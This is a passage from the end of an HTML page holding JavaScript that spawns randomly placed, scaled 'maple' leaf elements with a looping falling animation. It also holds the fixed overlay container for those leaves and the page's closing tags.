      const maples = Array.from({ length: mapleCount }).map(() => {
        const maple = document.createElement("div");
        const scale = Math.random() * 0.5 + 0.5;
        const offset = Math.random() * 2 - 1;
        const x = Math.random() * mapleEl.clientWidth;
        const y = -Math.random() * mapleEl.clientHeight;
        const duration = 10 / speed;
        const delay = -duration;
        maple.className = "maple";
        maple.style.width = `${24 * scale}px`;
        maple.style.height = `${24 * scale}px`;
        maple.style.left = `${x}px`;
        maple.style.top = `${y}px`;
        maple.style.setProperty("--maple-fall-offset", offset);
        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
        maple.style.animation = `fall ${duration}s linear infinite`;
        maple.style.animationDelay = `${delay}s`;
        mapleEl.appendChild(maple)
        return maple
      })
    });
  </script>
  


  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
</body>

</html>
